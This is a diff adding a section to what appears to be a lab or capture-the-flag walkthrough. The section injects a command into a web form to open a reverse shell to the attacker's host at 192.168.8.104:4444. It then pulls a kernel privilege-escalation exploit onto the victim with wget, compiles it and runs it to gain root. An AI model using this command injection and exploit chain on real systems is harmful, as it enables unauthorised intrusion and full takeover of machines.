@@ -77,3 +77,66 @@ As output shows we're logged in as apache, so now we need to use privilege escal
 Linux command uname -a (Unix name) prints back info about the name and version of operating system running on machine.
 
   ![alt text](/screens/panel2.png)
+
+  ![alt text](/screens/uname.png)
+  
+  So we see that the system running is **GNU/Linux version 2.6.9**
+  Quick research shows that this kernel is vulerable!
+	https://www.exploit-db.com/exploits/9542
+	
+Exploit is **local** so we need to get it into victim machine.
+
+On our machine we need to set up a netcat listener
+
+```
+netcat -v -l -p 4444
+
+-v (verbose)
+-l (listen)
+-p(port)
+4444-port to listen on
+```
+On the victim machine we gonna inject a one line reverse shell with our IP and port that we specified in netcat listener.
+
+```
+www.google.com;bash -i >& /dev/tcp/192.168.8.104/4444 0>&1
+```
+Once we click submit our netcat listener should revice a connection.
+
+  ![alt text](/screens/netcat_listener.png)
+ Great, we have a reverse shell on victim machine.
+ 
+ ## Using the exploit
+ 
+We need to download the exploit to our machine and serve as a host to download it from victim machine.
+Python's SimpleHTTPServer will do the job just fine.
+
+Move to the directory where the exploit is and start SimpleHTTPServer with command:
+
+```
+python -m SimpleHTTPServer
+```
+
+Once started, we can access the files from the victim machine.
+Lets do it using **wget** 
+
+```
+http://192.168.8.104:8000/9542.c
+```
+
+Woops! **An Error gonna come up**
+  ![alt text](/screens/wgeterror.png)
+
+Its because we dont have the required permission as the **apache** user.
+But we do have an access to **/tmp/** location, lets insert it there then!
+
+  ![alt text](/screens/wgetsuccess.png)
+  
+ Works perfectly!
+Its a .c file so we need to compile it now using **gcc**.
+Type: ```gcc 9542.c -o exploit```
+And use the compiled exploit with ```./exploit```
+
+  ![alt text](/screens/root2.png)
+  
+  **Root obtained!** 
